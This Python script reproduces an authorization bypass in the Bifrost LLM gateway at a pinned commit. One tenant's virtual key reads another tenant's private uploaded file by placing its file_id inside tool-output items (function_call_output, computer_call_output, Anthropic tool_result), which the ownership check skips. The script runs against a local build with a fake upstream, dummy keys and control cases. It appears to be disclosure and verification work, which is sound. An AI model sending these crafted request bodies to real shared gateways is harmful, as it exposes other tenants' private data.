#!/usr/bin/env python3
"""Reproduce issue 148 through Bifrost's public Responses and Anthropic Messages endpoints.

When virtual keys share a provider credential and object ownership isolation is
enabled (`client.enforce_vk_object_ownership=true`, the default), Bifrost tracks
which virtual key uploaded a provider file on `POST /v1/files` and blocks other
virtual keys from retrieving that file (`GET /v1/files/{id}`) or referencing its
`file_id` in user messages (`POST /v1/responses` and `POST /anthropic/v1/messages`).

However, `inferenceFileIDs` (`plugins/governance/providerjobs.go:689-704`) skips
any `ResponsesMessage` where `message.Content == nil`, never inspecting
`message.ResponsesToolMessage`. Because tool-output items (`function_call_output`,
`custom_tool_call_output`, `computer_call_output`, and Anthropic `tool_result`
blocks converted via `ToBifrostResponsesRequest`) populate `ResponsesToolMessage`
with `Content == nil`, any virtual key can reference another virtual key's
private `file_id` inside a tool output and Bifrost forwards it upstream with the
shared provider key.

Reviewer run:
    BIFROST_SOURCE=/path/to/bifrost BIFROST_BIN=/path/to/bifrost-http \
        python3 transcripts/148/reproduce.py

Maintainer fixture refresh:
    BIFROST_SOURCE=/path/to/bifrost BIFROST_BIN=/path/to/bifrost-http \
        python3 transcripts/148/reproduce.py --output-dir transcripts/148
"""

import argparse
import http.client
import io
import json
import os
from pathlib import Path
import re
import socket
import socketserver
import subprocess
import sys
import tempfile
import threading
import time
from datetime import datetime

HOST = "127.0.0.1"
PINNED_COMMIT = "783c682951a1c4d6a07a677779e0becab8bbbe2c"
EXPECTED_CORE_VERSION = "1.16.0"
EXPECTED_VERSION = "1.16.0-783c682951"
RUNS = 5
READY_TIMEOUT_SECONDS = 60

VK_TENANT_A = "sk-bf-vk-tenant-a-dummy-not-a-real-credential-148"
VK_TENANT_B = "sk-bf-vk-tenant-b-dummy-not-a-real-credential-148"
PROVIDER_KEY = "sk-proj-dummy-shared-openai-provider-key-148"
TENANT_A_FILE_ID = "file-tenant-a-secret-148"
TENANT_A_FILE_CANARY = "CANARY_TENANT_A_PRIVATE_FILE_BYTES_148"

RELEVANT_SOURCE_PATHS = (
    "plugins/governance/providerjobs.go",
    "plugins/governance/main.go",
    "core/providers/anthropic/responses.go",
    "core/schemas/responses.go",
    "transports/bifrost-http/handlers/inference.go",
)


class ReproductionError(Exception):
    """A reproduction failure whose message contains no live credential."""


def require(condition, message):
    if not condition:
        raise ReproductionError(message)


def free_port():
    with socket.socket() as sock:
        sock.bind((HOST, 0))
        return sock.getsockname()[1]


def parse_http_response(raw):
    class CapturedSocket:
        def makefile(self, mode):
            return io.BytesIO(raw)

    try:
        response = http.client.HTTPResponse(CapturedSocket())
        response.begin()
        status = response.status
        headers = list(response.getheaders())
        body = response.read()
        return status, headers, body
    except (http.client.HTTPException, ValueError) as exc:
        raise ReproductionError("malformed or truncated HTTP response") from exc


def raw_request(
    port,
    method,
    path,
    body=b"",
    virtual_key=None,
    content_type="application/json",
    extra_headers=None,
    timeout=10,
):
    lines = [
        f"{method} {path} HTTP/1.1",
        f"Host: {HOST}:{port}",
    ]
    if content_type:
        lines.append(f"Content-Type: {content_type}")
    if body or method in ("POST", "PUT", "PATCH"):
        lines.append(f"Content-Length: {len(body)}")
    if virtual_key is not None:
        lines.append(f"x-bf-vk: {virtual_key}")
    if extra_headers:
        for k, v in extra_headers.items():
            lines.append(f"{k}: {v}")
    lines.append("Connection: close")
    request = ("\r\n".join(lines) + "\r\n\r\n").encode("ascii") + body
    with socket.create_connection((HOST, port), timeout=timeout) as sock:
        sock.sendall(request)
        chunks = []
        while True:
            chunk = sock.recv(65536)
            if not chunk:
                break
            chunks.append(chunk)
    response = b"".join(chunks)
    status, headers, response_body = parse_http_response(response)
    return request, response, status, headers, response_body


def build_multipart_file_upload(filename, file_bytes, purpose="user_data"):
    boundary = "----BifrostReproBoundary148"
    parts = [
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="purpose"\r\n\r\n'
        f"{purpose}\r\n",
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="file"; filename="{filename}"\r\n'
        f"Content-Type: application/pdf\r\n\r\n"
        f"{file_bytes}\r\n",
        f"--{boundary}--\r\n",
    ]
    body = "".join(parts).encode("utf-8")
    content_type = f"multipart/form-data; boundary={boundary}"
    return body, content_type


def read_one_request(stream):
    request_line = stream.readline()
    if not request_line:
        return b"", "", "", {}, b""
    header_lines = []
    while True:
        line = stream.readline()
        if not line:
            raise ReproductionError("capture upstream received truncated headers")
        header_lines.append(line)
        if line in (b"\r\n", b"\n"):
            break
    headers = {}
    for line in header_lines[:-1]:
        name, separator, value = line.partition(b":")
        require(separator == b":", "capture upstream received malformed header")
        headers[name.decode("latin-1").lower()] = value.strip().decode("latin-1")
    if headers.get("transfer-encoding", "").lower() == "chunked":
        chunks = []
        while True:
            size_line = stream.readline()
            require(bool(size_line), "truncated chunk size")
            size = int(size_line.strip().split(b";")[0], 16)
            if size == 0:
                stream.readline()
                break
            chunk_data = stream.read(size)
            require(len(chunk_data) == size, "truncated chunk data")
            chunks.append(chunk_data)
            stream.readline()
        body = b"".join(chunks)
    else:
        content_length = int(headers.get("content-length", "0"))
        body = stream.read(content_length)
        require(len(body) == content_length, "capture upstream received truncated body")
    raw = request_line + b"".join(header_lines) + body
    parts = request_line.decode("latin-1").strip().split(" ")
    method = parts[0]
    path = parts[1]
    return raw, method, path, headers, body


class CaptureHandler(socketserver.StreamRequestHandler):
    def handle(self):
        raw, method, path, headers, request_body = read_one_request(self.rfile)
        if not raw:
            return

        if path.endswith("/v1/models") or path.endswith("/models"):
            body = json.dumps(
                {"object": "list", "data": [{"id": "gpt-4o-mini", "object": "model"}]},
                separators=(",", ":"),
            ).encode()
        elif method == "POST" and path.endswith("/v1/files"):
            body = json.dumps(
                {
                    "id": TENANT_A_FILE_ID,
                    "object": "file",
                    "bytes": len(TENANT_A_FILE_CANARY),
                    "created_at": 1790000000,
                    "filename": "tenant-a-secret.pdf",
                    "purpose": "user_data",
                },
                separators=(",", ":"),
            ).encode()
        elif method == "GET" and f"/v1/files/{TENANT_A_FILE_ID}" in path:
            body = json.dumps(
                {
                    "id": TENANT_A_FILE_ID,
                    "object": "file",
                    "bytes": len(TENANT_A_FILE_CANARY),
                    "created_at": 1790000000,
                    "filename": "tenant-a-secret.pdf",
                    "purpose": "user_data",
                },
                separators=(",", ":"),
            ).encode()
        elif method == "POST" and path.endswith("/v1/responses"):
            body = json.dumps(
                {
                    "id": "resp_148",
                    "object": "response",
                    "created_at": 1790000001,
                    "status": "completed",
                    "model": "gpt-4o-mini",
                    "output": [
                        {
                            "id": "msg_148",
                            "type": "message",
                            "status": "completed",
                            "role": "assistant",
                            "content": [
                                {
                                    "type": "output_text",
                                    "text": f"Processed file {TENANT_A_FILE_ID}: {TENANT_A_FILE_CANARY}",
                                    "annotations": [],
                                }
                            ],
                        }
                    ],
                    "usage": {"input_tokens": 12, "output_tokens": 8, "total_tokens": 20},
                },
                separators=(",", ":"),
            ).encode()
        elif method == "POST" and path.endswith("/v1/chat/completions"):
            body = json.dumps(
                {
                    "id": "chatcmpl_148",
                    "object": "chat.completion",
                    "created": 1790000001,
                    "model": "gpt-4o-mini",
                    "choices": [
                        {
                            "index": 0,
                            "message": {
                                "role": "assistant",
                                "content": f"Processed file {TENANT_A_FILE_ID}: {TENANT_A_FILE_CANARY}",
                            },
                            "finish_reason": "stop",
                        }
                    ],
                    "usage": {"prompt_tokens": 12, "completion_tokens": 8, "total_tokens": 20},
                },
                separators=(",", ":"),
            ).encode()
        else:
            body = json.dumps({"error": {"message": f"unexpected route {method} {path}"}}).encode()

        response_headers = [
            b"HTTP/1.1 200 OK",
            b"Content-Type: application/json",
            f"Content-Length: {len(body)}".encode(),
            b"Connection: close",
        ]
        response = b"\r\n".join(response_headers) + b"\r\n\r\n" + body
        self.request.sendall(response)

        if not path.endswith("/models"):
            with self.server.capture_lock:
                self.server.exchanges.append(
                    {
                        "method": method,
                        "path": path,
                        "headers": headers,
                        "body": request_body,
                        "raw_request": raw,
                        "raw_response": response,
                    }
                )


class CaptureServer(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True

    def __init__(self, address):
        super().__init__(address, CaptureHandler)
        self.capture_lock = threading.Lock()
        self.exchanges = []

    def drain_exchanges(self):
        with self.capture_lock:
            items = list(self.exchanges)
            self.exchanges.clear()
            return items


def sanitize_client_bytes(raw):
    out = raw.replace(VK_TENANT_A.encode(), b"<VK_TENANT_A>")
    out = out.replace(VK_TENANT_B.encode(), b"<VK_TENANT_B>")
    return out


def sanitize_upstream_bytes(raw):
    return re.sub(
        rb"(?im)^(authorization:\s*bearer\s+)[^\r\n]+",
        rb"\1<SHARED_PROVIDER_API_KEY>",
        raw,
    )


def check_source(source):
    require((source / ".git").exists(), "BIFROST_SOURCE is not a Git checkout")
    revision = subprocess.check_output(
        ["git", "rev-parse", "HEAD"], cwd=source, text=True
    ).strip()
    require(
        revision == PINNED_COMMIT,
        f"expected Bifrost {PINNED_COMMIT}, found {revision}",
    )
    diff = subprocess.run(
        ["git", "diff", "--quiet", "HEAD", "--", *RELEVANT_SOURCE_PATHS],
        cwd=source,
        check=False,
    )
    require(diff.returncode == 0, "relevant Bifrost source files have local changes")
    core_version = (source / "core/version").read_text().strip()
    require(
        core_version == EXPECTED_CORE_VERSION,
        f"expected core {EXPECTED_CORE_VERSION}, found {core_version}",
    )


def check_binary(binary):
    build_info = subprocess.check_output(
        ["go", "version", "-m", str(binary)], text=True
    )
    require(
        "path\tgithub.com/maximhq/bifrost/transports/v2/bifrost-http" in build_info,
        "BIFROST_BIN is not the official Bifrost HTTP transport package",
    )
    require(
        f"build\tvcs.revision={PINNED_COMMIT}" in build_info,
        "BIFROST_BIN was not built from the pinned Bifrost revision",
    )
    require(
        f"-X main.Version={EXPECTED_VERSION}" in build_info,
        "BIFROST_BIN lacks the expected version linker setting",
    )
    modified = "build\tvcs.modified=true" in build_info
    return {"vcs_revision": PINNED_COMMIT, "vcs_modified": modified}


def make_config(app_dir, upstream_port):
    return {
        "$schema": "https://www.getbifrost.ai/schema",
        "client": {
            "enable_logging": False,
            "enforce_auth_on_inference": True,
            "enforce_vk_object_ownership": True,
            "initial_pool_size": 8,
        },
        "config_store": {
            "enabled": True,
            "type": "sqlite",
            "config": {"path": str(app_dir / "config.db")},
        },
        "logs_store": {"enabled": False},
        "governance": {
            "virtual_keys": [
                {
                    "id": "vk-tenant-a",
                    "name": "tenant-a",
                    "value": VK_TENANT_A,
                    "is_active": True,
                    "provider_configs": [
                        {
                            "provider": "openai",
                            "allowed_models": ["*"],
                            "key_ids": ["key-openai-1"],
                            "weight": 1,
                        }
                    ],
                },
                {
                    "id": "vk-tenant-b",
                    "name": "tenant-b",
                    "value": VK_TENANT_B,
                    "is_active": True,
                    "provider_configs": [
                        {
                            "provider": "openai",
                            "allowed_models": ["*"],
                            "key_ids": ["key-openai-1"],
                            "weight": 1,
                        }
                    ],
                },
            ]
        },
        "providers": {
            "openai": {
                "keys": [
                    {
                        "id": "key-openai-1",
                        "name": "shared-openai-key",
                        "value": PROVIDER_KEY,
                        "weight": 1,
                        "models": ["*"],
                        "use_for_batch_api": True,
                    }
                ],
                "network_config": {
                    "base_url": f"http://{HOST}:{upstream_port}",
                    "allow_private_network": True,
                },
            }
        },
    }


def wait_for_ready(port, process, log_path):
    deadline = time.monotonic() + READY_TIMEOUT_SECONDS
    while time.monotonic() < deadline:
        code = process.poll()
        require(code is None, f"Bifrost exited during startup with code {code}")
        try:
            _, _, status, _, body = raw_request(port, "GET", "/api/version")
            if status == 200:
                version = json.loads(body.decode())
                require(
                    version == EXPECTED_VERSION,
                    f"expected binary {EXPECTED_VERSION}, found {version}",
                )
                return version
        except (OSError, ReproductionError, UnicodeDecodeError, json.JSONDecodeError):
            pass
        time.sleep(0.25)
    diagnostic = Path(log_path).read_bytes()[-4096:]
    diagnostic = sanitize_client_bytes(diagnostic).replace(
        PROVIDER_KEY.encode(), b"<SHARED_PROVIDER_API_KEY>"
    )
    raise ReproductionError(
        "Bifrost did not become ready; sanitized log tail:\n"
        + diagnostic.decode(errors="replace")
    )


def write_artifacts(output_dir, artifacts):
    output_dir.mkdir(parents=True, exist_ok=True)
    for name, value in artifacts.items():
        path = output_dir / name
        if isinstance(value, bytes):
            path.write_bytes(value)
        else:
            path.write_text(json.dumps(value, indent=2, sort_keys=True) + "\n")


def run(binary, source, output_dir):
    check_source(source)
    require(binary.is_file(), f"BIFROST_BIN does not exist: {binary}")
    require(os.access(binary, os.X_OK), f"BIFROST_BIN is not executable: {binary}")
    binary_provenance = check_binary(binary)

    bifrost_port = free_port()
    upstream_port = free_port()

    capture_server = CaptureServer((HOST, upstream_port))
    capture_thread = threading.Thread(target=capture_server.serve_forever, daemon=True)
    capture_thread.start()
    process = None
    log_file = None
    try:
        with tempfile.TemporaryDirectory(prefix="kairo-148-bifrost-") as app_dir_text:
            app_dir = Path(app_dir_text)
            (app_dir / "config.json").write_text(
                json.dumps(make_config(app_dir, upstream_port), indent=2) + "\n"
            )
            log_file = tempfile.NamedTemporaryFile(prefix="kairo-148-log-", delete=False)
            log_path = log_file.name
            environment = {
                "PATH": os.environ.get("PATH", "/usr/bin:/bin"),
                "LANG": "C.UTF-8",
                "TMPDIR": os.environ.get("TMPDIR", "/tmp"),
            }
            process = subprocess.Popen(
                [
                    str(binary),
                    "-app-dir",
                    str(app_dir),
                    "-host",
                    HOST,
                    "-port",
                    str(bifrost_port),
                    "-log-level",
                    "error",
                ],
                cwd=app_dir,
                env=environment,
                stdout=log_file,
                stderr=subprocess.STDOUT,
            )
            version = wait_for_ready(bifrost_port, process, log_path)
            capture_server.drain_exchanges()

            # Step 0: Tenant A uploads its private file via POST /v1/files.
            mp_body, mp_ct = build_multipart_file_upload(
                "tenant-a-secret.pdf", TENANT_A_FILE_CANARY
            )
            upload_req, upload_resp, status, _, body = raw_request(
                bifrost_port,
                "POST",
                "/v1/files?provider=openai",
                body=mp_body,
                virtual_key=VK_TENANT_A,
                content_type=mp_ct,
            )
            require(
                status == 200,
                f"Tenant A file upload failed with HTTP {status}: {body!r}",
            )
            upload_exchanges = capture_server.drain_exchanges()
            require(
                len(upload_exchanges) == 1,
                f"expected 1 upstream file upload, saw {len(upload_exchanges)}",
            )
            upload_transcript = sanitize_client_bytes(upload_req) + upload_resp

            # Payloads for the 3 cross-VK controls, 1 owner positive control, and 3 cross-VK tool-output attacks.
            user_msg_responses_body = json.dumps(
                {
                    "model": "openai/gpt-4o-mini",
                    "input": [
                        {
                            "type": "message",
                            "role": "user",
                            "content": [
                                {"type": "input_file", "file_id": TENANT_A_FILE_ID},
                                {"type": "input_text", "text": "Summarize this file."},
                            ],
                        }
                    ],
                },
                separators=(",", ":"),
            ).encode()

            user_msg_anthropic_body = json.dumps(
                {
                    "model": "openai/gpt-4o-mini",
                    "max_tokens": 64,
                    "messages": [
                        {
                            "role": "user",
                            "content": [
                                {
                                    "type": "document",
                                    "source": {
                                        "type": "file",
                                        "file_id": TENANT_A_FILE_ID,
                                    },
                                },
                                {"type": "text", "text": "Summarize this file."},
                            ],
                        }
                    ],
                },
                separators=(",", ":"),
            ).encode()

            fn_call_output_responses_body = json.dumps(
                {
                    "model": "openai/gpt-4o-mini",
                    "input": [
                        {
                            "type": "message",
                            "role": "user",
                            "content": "Read the document via fetch_doc.",
                        },
                        {
                            "type": "function_call",
                            "call_id": "call_148",
                            "name": "fetch_doc",
                            "arguments": "{}",
                        },
                        {
                            "type": "function_call_output",
                            "call_id": "call_148",
                            "output": [
                                {"type": "input_file", "file_id": TENANT_A_FILE_ID}
                            ],
                        },
                    ],
                },
                separators=(",", ":"),
            ).encode()

            computer_call_output_responses_body = json.dumps(
                {
                    "model": "openai/gpt-4o-mini",
                    "input": [
                        {
                            "type": "message",
                            "role": "user",
                            "content": "Take a screenshot.",
                        },
                        {
                            "type": "computer_call_output",
                            "call_id": "call_comp_148",
                            "output": {
                                "type": "computer_screenshot",
                                "file_id": TENANT_A_FILE_ID,
                            },
                        },
                    ],
                },
                separators=(",", ":"),
            ).encode()

            tool_result_anthropic_body = json.dumps(
                {
                    "model": "openai/gpt-4o-mini",
                    "max_tokens": 64,
                    "messages": [
                        {"role": "user", "content": "Read the document."},
                        {
                            "role": "assistant",
                            "content": [
                                {
                                    "type": "tool_use",
                                    "id": "toolu_148",
                                    "name": "fetch_doc",
                                    "input": {},
                                }
                            ],
                        },
                        {
                            "role": "user",
                            "content": [
                                {
                                    "type": "tool_result",
                                    "tool_use_id": "toolu_148",
                                    "content": [
                                        {
                                            "type": "document",
                                            "source": {
                                                "type": "file",
                                                "file_id": TENANT_A_FILE_ID,
                                            },
                                        }
                                    ],
                                }
                            ],
                        },
                    ],
                },
                separators=(",", ":"),
            ).encode()

            artifacts = {
                "tenant-a-file-upload.http": upload_transcript,
            }
            counts = {
                "control_direct_file_retrieve_blocked_404": 0,
                "control_responses_user_message_blocked_404": 0,
                "control_anthropic_user_message_blocked_404": 0,
                "control_owner_tool_output_allowed_200": 0,
                "attack_responses_function_call_output_bypassed_200": 0,
                "attack_responses_computer_call_output_bypassed_200": 0,
                "attack_anthropic_tool_result_bypassed_200": 0,
            }
            trial_rows = []

            for trial in range(1, RUNS + 1):
                # Control 1: Tenant B direct GET /v1/files/{id}?provider=openai -> 404, 0 upstream
                req, resp, status, _, body = raw_request(
                    bifrost_port,
                    "GET",
                    f"/v1/files/{TENANT_A_FILE_ID}?provider=openai",
                    virtual_key=VK_TENANT_B,
                    content_type=None,
                )
                ex = capture_server.drain_exchanges()
                require(
                    status == 404
                    and len(ex) == 0
                    and b"access_blocked" in body
                    and f"file '{TENANT_A_FILE_ID}' not found".encode() in body,
                    f"trial {trial}: expected 404 and 0 upstream for direct file retrieve, got {status} and {len(ex)}",
                )
                counts["control_direct_file_retrieve_blocked_404"] += 1
                if "control-direct-file-retrieve.http" not in artifacts:
                    artifacts["control-direct-file-retrieve.http"] = (
                        sanitize_client_bytes(req) + resp
                    )

                # Control 2: Tenant B POST /v1/responses with user message input_file -> 404 access_blocked, 0 upstream
                req, resp, status, _, body = raw_request(
                    bifrost_port,
                    "POST",
                    "/v1/responses",
                    body=user_msg_responses_body,
                    virtual_key=VK_TENANT_B,
                )
                ex = capture_server.drain_exchanges()
                require(
                    status == 404
                    and len(ex) == 0
                    and b"access_blocked" in body
                    and f"file '{TENANT_A_FILE_ID}' not found".encode() in body,
                    f"trial {trial}: expected 404 for Responses user message control, got {status}: {body!r}",
                )
                counts["control_responses_user_message_blocked_404"] += 1
                if "control-responses-user-message.http" not in artifacts:
                    artifacts["control-responses-user-message.http"] = (
                        sanitize_client_bytes(req) + resp
                    )

                # Control 3: Tenant B POST /anthropic/v1/messages with user message document -> 404 not_found_error, 0 upstream
                req, resp, status, _, body = raw_request(
                    bifrost_port,
                    "POST",
                    "/anthropic/v1/messages",
                    body=user_msg_anthropic_body,
                    virtual_key=VK_TENANT_B,
                )
                ex = capture_server.drain_exchanges()
                require(
                    status == 404
                    and len(ex) == 0
                    and b"not_found_error" in body
                    and f"file '{TENANT_A_FILE_ID}' not found".encode() in body,
                    f"trial {trial}: expected 404 for Anthropic user message control, got {status}: {body!r}",
                )
                counts["control_anthropic_user_message_blocked_404"] += 1
                if "control-anthropic-user-message.http" not in artifacts:
                    artifacts["control-anthropic-user-message.http"] = (
                        sanitize_client_bytes(req) + resp
                    )

                # Control 4: Owner Tenant A POST /v1/responses with function_call_output input_file -> 200, 1 upstream
                req, resp, status, _, body = raw_request(
                    bifrost_port,
                    "POST",
                    "/v1/responses",
                    body=fn_call_output_responses_body,
                    virtual_key=VK_TENANT_A,
                )
                ex = capture_server.drain_exchanges()
                require(
                    status == 200
                    and len(ex) == 1
                    and TENANT_A_FILE_ID.encode() in ex[0]["body"],
                    f"trial {trial}: expected 200 for owner tool output control, got {status}",
                )
                counts["control_owner_tool_output_allowed_200"] += 1
                if "control-owner-tool-output.http" not in artifacts:
                    artifacts["control-owner-tool-output.http"] = (
                        sanitize_client_bytes(req) + resp
                    )

                # Attack 1: Tenant B POST /v1/responses with function_call_output input_file -> 200 (defect), 1 upstream
                req, resp, status, _, body = raw_request(
                    bifrost_port,
                    "POST",
                    "/v1/responses",
                    body=fn_call_output_responses_body,
                    virtual_key=VK_TENANT_B,
                )
                ex = capture_server.drain_exchanges()
                require(
                    status == 200
                    and len(ex) == 1
                    and TENANT_A_FILE_ID.encode() in ex[0]["body"]
                    and TENANT_A_FILE_CANARY.encode() in body,
                    f"trial {trial}: expected 200 bypass on function_call_output, got {status}",
                )
                counts["attack_responses_function_call_output_bypassed_200"] += 1
                if "attack-responses-function-call-output.http" not in artifacts:
                    artifacts["attack-responses-function-call-output.http"] = (
                        sanitize_client_bytes(req) + resp
                    )
                    artifacts[
                        "attack-responses-function-call-output-upstream.http"
                    ] = (
                        sanitize_upstream_bytes(ex[0]["raw_request"])
                        + ex[0]["raw_response"]
                    )

                # Attack 2: Tenant B POST /v1/responses with computer_call_output screenshot file_id -> 200 (defect), 1 upstream
                req, resp, status, _, body = raw_request(
                    bifrost_port,
                    "POST",
                    "/v1/responses",
                    body=computer_call_output_responses_body,
                    virtual_key=VK_TENANT_B,
                )
                ex = capture_server.drain_exchanges()
                require(
                    status == 200
                    and len(ex) == 1
                    and TENANT_A_FILE_ID.encode() in ex[0]["body"]
                    and TENANT_A_FILE_CANARY.encode() in body,
                    f"trial {trial}: expected 200 bypass on computer_call_output, got {status}",
                )
                counts["attack_responses_computer_call_output_bypassed_200"] += 1
                if "attack-responses-computer-call-output.http" not in artifacts:
                    artifacts["attack-responses-computer-call-output.http"] = (
                        sanitize_client_bytes(req) + resp
                    )
                    artifacts[
                        "attack-responses-computer-call-output-upstream.http"
                    ] = (
                        sanitize_upstream_bytes(ex[0]["raw_request"])
                        + ex[0]["raw_response"]
                    )

                # Attack 3: Tenant B POST /anthropic/v1/messages with tool_result document file_id -> 200 (defect), 1 upstream
                req, resp, status, _, body = raw_request(
                    bifrost_port,
                    "POST",
                    "/anthropic/v1/messages",
                    body=tool_result_anthropic_body,
                    virtual_key=VK_TENANT_B,
                )
                ex = capture_server.drain_exchanges()
                require(
                    status == 200
                    and len(ex) == 1
                    and TENANT_A_FILE_ID.encode() in ex[0]["body"]
                    and TENANT_A_FILE_CANARY.encode() in body,
                    f"trial {trial}: expected 200 bypass on Anthropic tool_result, got {status}",
                )
                counts["attack_anthropic_tool_result_bypassed_200"] += 1
                if "attack-anthropic-tool-result.http" not in artifacts:
                    artifacts["attack-anthropic-tool-result.http"] = (
                        sanitize_client_bytes(req) + resp
                    )
                    artifacts["attack-anthropic-tool-result-upstream.http"] = (
                        sanitize_upstream_bytes(ex[0]["raw_request"])
                        + ex[0]["raw_response"]
                    )

                trial_rows.append(
                    {
                        "trial": trial,
                        "control_direct_file_retrieve_status": 404,
                        "control_responses_user_message_status": 404,
                        "control_anthropic_user_message_status": 404,
                        "control_owner_tool_output_status": 200,
                        "attack_responses_function_call_output_status": 200,
                        "attack_responses_computer_call_output_status": 200,
                        "attack_anthropic_tool_result_status": 200,
                    }
                )

            results = {
                "complete": True,
                "date_checked": datetime.now().astimezone().date().isoformat(),
                "target": {
                    "repository": "https://github.com/maximhq/bifrost",
                    "commit": PINNED_COMMIT,
                    "core_version": EXPECTED_CORE_VERSION,
                    "binary_version": version,
                    "binary_vcs_revision": binary_provenance["vcs_revision"],
                    "binary_vcs_modified": binary_provenance["vcs_modified"],
                    "endpoints": [
                        "POST /v1/files",
                        "GET /v1/files/{file_id}",
                        "POST /v1/responses",
                        "POST /anthropic/v1/messages",
                    ],
                    "client_dialects": [
                        "OpenAI Files",
                        "OpenAI Responses",
                        "Anthropic Messages",
                    ],
                    "backend_dialects": [
                        "OpenAI Files",
                        "OpenAI Responses",
                        "OpenAI Chat Completions",
                    ],
                    "provider": "openai (deterministic local capture upstream)",
                    "model": "openai/gpt-4o-mini",
                    "enforce_auth_on_inference": True,
                    "enforce_vk_object_ownership": True,
                },
                "runs": RUNS,
                "summary": counts,
                "trials": trial_rows,
                "secrets": "synthetic canaries only; no real provider credential was used",
            }
            artifacts["results.json"] = results
            write_artifacts(output_dir, artifacts)
            return results
    finally:
        if process is not None and process.poll() is None:
            process.terminate()
            try:
                process.wait(timeout=10)
            except subprocess.TimeoutExpired:
                process.kill()
                process.wait(timeout=5)
        if log_file is not None:
            log_path = log_file.name
            log_file.close()
            try:
                os.unlink(log_path)
            except FileNotFoundError:
                pass
        capture_server.shutdown()
        capture_server.server_close()
        capture_thread.join(timeout=5)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--output-dir",
        type=Path,
        help="artifact directory; defaults to a fresh ignored temporary directory",
    )
    parser.add_argument("--binary", type=Path, default=os.environ.get("BIFROST_BIN"))
    parser.add_argument("--source", type=Path, default=os.environ.get("BIFROST_SOURCE"))
    args = parser.parse_args()
    require(args.binary is not None, "set BIFROST_BIN or pass --binary")
    require(args.source is not None, "set BIFROST_SOURCE or pass --source")
    output_dir = args.output_dir
    if output_dir is None:
        output_dir = Path(tempfile.mkdtemp(prefix="kairo-148-review-"))
    results = run(args.binary.resolve(), args.source.resolve(), output_dir.resolve())
    print(json.dumps(results, indent=2, sort_keys=True))
    print(f"artifacts: {output_dir.resolve()}")


if __name__ == "__main__":
    try:
        main()
    except (OSError, subprocess.SubprocessError, ReproductionError) as exc:
        print(f"reproduction failed: {exc}", file=sys.stderr)
        raise SystemExit(1)
